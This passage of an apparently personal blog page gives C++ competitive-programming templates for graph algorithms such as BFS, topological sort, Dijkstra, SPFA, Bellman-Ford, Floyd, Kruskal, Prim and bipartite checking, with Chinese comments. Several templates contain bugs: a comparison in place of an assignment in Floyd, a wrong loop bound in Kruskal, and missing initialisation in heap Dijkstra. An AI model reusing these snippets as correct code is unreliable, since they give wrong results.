r[k];</span><br><span class="line">	l[r[k]] = l[k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h1><h2 id="bfs"><a href="#bfs" class="headerlink" title="bfs"></a>bfs</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> g[N][N], d[N][N];<span class="comment">//g负责存地图，d负责记录有没有走过</span></span><br><span class="line">pii q[N * N],p[N ][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> dx[<span class="number">4</span>] = &#123; <span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span> &#125;, dy[<span class="number">4</span>] = &#123; <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span> &#125;;</span><br><span class="line">	<span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">0</span>;<span class="comment">//采用栈的形式进行数据的堆叠</span></span><br><span class="line">	<span class="built_in">memset</span>(d, <span class="number">-1</span>, <span class="keyword">sizeof</span> d);</span><br><span class="line">	q[<span class="number">0</span>] = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	d[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (hh &lt;= tt) &#123;</span><br><span class="line">		<span class="keyword">auto</span> t = q[hh++];</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">			<span class="type">int</span> x = t.first + dx[i], y = t.second + dy[i];<span class="comment">//上下左右遍历</span></span><br><span class="line">			<span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt; n &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; m &amp;&amp; g[x][y] == <span class="number">0</span> &amp;&amp; d[x][y] == <span class="number">-1</span>) &#123;</span><br><span class="line">				d[x][y] = d[t.first][t.second] + <span class="number">1</span>;<span class="comment">//记录他是几号点</span></span><br><span class="line">			<span class="comment">//	d[x][y] = 1;</span></span><br><span class="line">				p[x][y] = t;<span class="comment">//把上一个点塞进去了，类似于递归</span></span><br><span class="line">				q[++tt] = &#123; x,y &#125;;<span class="comment">//满足条件则往栈顶压入数据</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//输出路迳   </span></span><br><span class="line">	<span class="type">int</span> x = n - <span class="number">1</span>, y = m - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (x || y) &#123;</span><br><span class="line">		cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">auto</span> t = p[x][y];</span><br><span class="line">		x = t.first, y = t.second;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> d[n - <span class="number">1</span>][m - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)cin &gt;&gt; g[i][j];</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;<span class="built_in">bfs</span>()&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="图的拓扑排序-有向无环图一定有拓扑序列"><a href="#图的拓扑排序-有向无环图一定有拓扑序列" class="headerlink" title="图的拓扑排序(有向无环图一定有拓扑序列)"></a>图的拓扑排序(有向无环图一定有拓扑序列)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"><span class="type">int</span> q[N], d[N];<span class="comment">//q[N]为队列，d[N]是入度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	e[idx] = b, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">topsort</span><span class="params">()</span> </span>&#123;<span class="comment">//队列中hh是对头，tt是队尾</span></span><br><span class="line">	<span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!d[i])q[++tt] = i;&#125;<span class="comment">//将入度为0的点放进队列</span></span><br><span class="line">		<span class="keyword">while</span> (hh &lt;= tt) &#123;</span><br><span class="line">			<span class="type">int</span> t = q[hh++];</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">				<span class="type">int</span> j = e[i];</span><br><span class="line">				d[j]--;<span class="comment">//让入度减减</span></span><br><span class="line">				<span class="keyword">if</span> (d[j] == <span class="number">0</span>)q[++tt] = j;<span class="comment">//当入度减为零了，将他压入队列</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> tt == n - <span class="number">1</span>;<span class="comment">//判断它是不是有向无环图</span></span><br><span class="line">&#125;<span class="comment">//q中存的就是拓扑排好的序列,d存的是每个点的入度</span></span><br></pre></td></tr></table></figure>
<h2 id="朴素dijkstra算法，单源求最短路"><a href="#朴素dijkstra算法，单源求最短路" class="headerlink" title="朴素dijkstra算法，单源求最短路"></a>朴素dijkstra算法，单源求最短路</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> g[N][N];</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">	dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j =<span class="number">1</span>; j &lt;=n; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">				t = j;</span><br><span class="line">		&#125;</span><br><span class="line">		st[t] = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">			dist[j] =<span class="built_in">min</span>(dist[j], dist[t] + g[t][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">	<span class="built_in">memset</span>(g, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		<span class="type">int</span> a, b, c;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">		g[a][b] = <span class="built_in">min</span>(g[a][b], c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> t = <span class="built_in">dijkstra</span>();</span><br><span class="line">	cout &lt;&lt; t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="堆优化版本的dijkstra"><a href="#堆优化版本的dijkstra" class="headerlink" title="堆优化版本的dijkstra"></a>堆优化版本的dijkstra</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//有向图求最短路</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> w[N], h[N], e[N], ne[N], idx;</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pii;</span><br><span class="line">priority_queue&lt;pii, vector&lt;pii&gt;, greater&lt;pii&gt;&gt; heap;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">	e[idx] = b, w[idx] = c, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist ,<span class="number">0x3f</span>,<span class="keyword">sizeof</span> dist);</span><br><span class="line">	<span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">	heap.<span class="built_in">push</span>(&#123; <span class="number">0</span>,<span class="number">1</span> &#125;);<span class="comment">//0表示dist【】，</span></span><br><span class="line">	<span class="keyword">while</span> (heap.<span class="built_in">size</span>()) &#123;</span><br><span class="line">     <span class="keyword">auto</span> t = heap.<span class="built_in">top</span>();</span><br><span class="line">	 heap.<span class="built_in">pop</span>();</span><br><span class="line">	 <span class="type">int</span> distance = t.first, val = t.second;</span><br><span class="line">	 <span class="keyword">if</span> (st[val])<span class="keyword">continue</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> i = h[val]; ~i; i = ne[i]) &#123;</span><br><span class="line">	      <span class="type">int</span> j = e[i];</span><br><span class="line">		   <span class="keyword">if</span> (dist[j] &gt; distance+w[i])  &#123; </span><br><span class="line">					  dist[j] = distance + w[i];</span><br><span class="line">                    heap.<span class="built_in">push</span>(&#123; dist[j],j &#125;);<span class="comment">//前一项表示到1的距离，后一项表示这个点</span></span><br><span class="line">				  &#125;   </span><br><span class="line">		      &#125;</span><br><span class="line">	     &#125;</span><br><span class="line">     <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	 <span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="spfa算法-求单源最短路迳，可以有负环"><a href="#spfa算法-求单源最短路迳，可以有负环" class="headerlink" title="spfa算法&#x2F;&#x2F;求单源最短路迳，可以有负环"></a>spfa算法&#x2F;&#x2F;求单源最短路迳，可以有负环</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//spfa算法</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">10010</span>;</span><br><span class="line"><span class="type">int</span> ne[N], idx, e[N], h[N], w[N];</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span>  c)</span> </span>&#123;</span><br><span class="line">	e[idx] = b, ne[idx] = h[a], w[idx] = c, h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">spfa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">	<span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">	dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">	q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">	st[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">		<span class="type">int</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">			q.<span class="built_in">pop</span>();</span><br><span class="line">			st[t] = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = h[t]; ~i; i = ne[i]) &#123;</span><br><span class="line">				<span class="type">int</span> j = e[i];</span><br><span class="line">				<span class="keyword">if</span> (dist[j] &gt; dist[t] + w[i]) &#123;</span><br><span class="line">					dist[j] = dist[t] + w[i];</span><br><span class="line">					<span class="comment">//cnt[j]=cnt[t]+1; if(cnt[j]&gt;=n)return true;判断负环</span></span><br><span class="line">					<span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">						q.<span class="built_in">push</span>(j);</span><br><span class="line">						st[j] = <span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;	</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">		<span class="type">int</span> a, b, c;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">		<span class="built_in">add</span>(a, b, c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> t = <span class="built_in">spfa</span>();</span><br><span class="line">	<span class="keyword">if</span> (t == <span class="number">-1</span>)cout &lt;&lt; <span class="string">&quot; no&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> cout &lt;&lt; t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="有边数限制的最短路bell-man-ford算法"><a href="#有边数限制的最短路bell-man-ford算法" class="headerlink" title="有边数限制的最短路bell-man ford算法"></a>有边数限制的最短路bell-man ford算法</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在边数限定条件的最短路</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span>  N = <span class="number">10010</span>;</span><br><span class="line"><span class="type">int</span> dist[N], backup[N];</span><br><span class="line"><span class="type">int</span> n, m, k;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">	<span class="type">int</span> a, b, w;</span><br><span class="line">&#125;edge[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bellman_ford</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">	dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">		<span class="built_in">memcpy</span>(backup, dist, <span class="keyword">sizeof</span> dist);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			<span class="type">int</span> x = edge[j].a, y = edge[j].b, z = edge[j].w;</span><br><span class="line">			dist[y] = <span class="built_in">min</span>(dist[y], backup[x] + z);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dist[n] &gt;<span class="number">0x3f3f3f3f</span> / <span class="number">2</span>)<span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//存在负权，有可能是0x3f3f3f3f-2，小于0x3f3f3f3f</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">		<span class="type">int</span> x, y, z;</span><br><span class="line">		cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;</span><br><span class="line">		edge[i] = &#123; x,y,z &#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> t = <span class="built_in">bellman_ford</span>();</span><br><span class="line">	<span class="keyword">if</span> (t == <span class="number">-1</span>)cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> cout &lt;&lt; t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="floyd算法求多源最短路"><a href="#floyd算法求多源最短路" class="headerlink" title="floyd算法求多源最短路"></a>floyd算法求多源最短路</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">210</span>,inf=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="type">int</span> n, m, q;</span><br><span class="line"><span class="type">int</span> dist[N][N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">floyd</span><span class="params">()</span> </span>&#123;<span class="comment">//基于动态规划的算法的k次前k-1次的点有关</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">				dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][k] + dist[k][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m &gt;&gt; q;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;			</span><br><span class="line">			<span class="keyword">if</span> (i == j)dist[i][j] == <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span> dist[i][j] = inf;</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;<span class="comment">//录入防止重边</span></span><br><span class="line">		<span class="type">int</span> x, y, z;</span><br><span class="line">		cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;</span><br><span class="line">		dist[x][y] = <span class="built_in">min</span>(dist[x][y],z);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">floyd</span>();</span><br><span class="line">	<span class="keyword">while</span> (q--) &#123;<span class="comment">//输出多源最短路</span></span><br><span class="line">		<span class="type">int</span> a, b;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">		<span class="keyword">if</span> (dist[a][b] &gt; inf / <span class="number">2</span>)cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; dist[a][b];</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="kruskal求最小生成树"><a href="#kruskal求最小生成树" class="headerlink" title="kruskal求最小生成树"></a>kruskal求最小生成树</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200010</span>;</span><br><span class="line"><span class="type">int</span> p[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">	<span class="type">int</span> a, b, w;</span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Edge &amp;W)<span class="type">const</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> w &lt; W.w;</span><br><span class="line">	&#125;<span class="comment">//在之后针对w进行排序</span></span><br><span class="line">&#125;edges[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (p[x] != x)p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">	<span class="keyword">return</span> p[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt;n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="type">int</span> a, b, w;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b &gt;&gt; w;</span><br><span class="line">		edges[i] = &#123; a,b,w &#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">sort</span>(edges, edges + m);<span class="comment">//按w的权重进行排序</span></span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)p[i] = i;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;m; i++) &#123;</span><br><span class="line">		<span class="type">int</span> a = edges[i].a, b = edges[i].b, w = edges[i].w;</span><br><span class="line">		a=<span class="built_in">find</span>(a); </span><br><span class="line">		b = <span class="built_in">find</span>(b);</span><br><span class="line">		<span class="keyword">if</span> (a != b) &#123;</span><br><span class="line">			p[a] = b;</span><br><span class="line">			res += w;</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (cnt &lt; n - <span class="number">1</span>)cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> cout &lt;&lt; res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="prim求最小生成树"><a href="#prim求最小生成树" class="headerlink" title="prim求最小生成树"></a>prim求最小生成树</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在最小生成树中无所谓边的权重是正还是负</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>,inf=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="type">int</span> n, m;  </span><br><span class="line"><span class="type">int</span> g[N][N];</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, inf, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) </span><br><span class="line">            <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">                t = j;</span><br><span class="line">            <span class="keyword">if</span> (i&gt;<span class="number">0</span> &amp;&amp; dist[t] == inf)<span class="keyword">return</span> inf;<span class="comment">//因为第一次i=0的循环所有dist都是inf，只是为了第一次更新所有的dist为到1的最短距离</span></span><br><span class="line">            <span class="keyword">if</span> (i&gt;<span class="number">0</span>)res += dist[t];<span class="comment">//先累加再更新</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                dist[j] = <span class="built_in">min</span>(dist[j],g[t][j]);</span><br><span class="line">            st[t] = <span class="literal">true</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="built_in">memset</span>(g, <span class="number">0x3f3f3f3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> x, y, c;</span><br><span class="line">        cin &gt;&gt; x &gt;&gt; y &gt;&gt; c;</span><br><span class="line">        g[x][y] = g[y][x] = <span class="built_in">min</span>(g[x][y],c);<span class="comment">//取得是边长的最小值，同时构建无向图</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="type">int</span> t= <span class="built_in">prim</span>();</span><br><span class="line">   <span class="keyword">if</span> (t == inf)cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span> cout &lt;&lt; t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="染色法判定二分图"><a href="#染色法判定二分图" class="headerlink" title="染色法判定二分图"></a>染色法判定二分图</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    e[idx] = b, ne[idx] = h[a], h[a] =idx++;<span class="comment">//链表</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">    color[u] = c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (!color[j]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">dfs</span>(j, <span class="number">3</span> - c)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (color[j] == c)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;<span class="comment">//以邻接表的形式存储</span></span><br><span class="line">    <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!color[i]) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">dfs</span>(i, <span class="number">1</span>)) &#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span 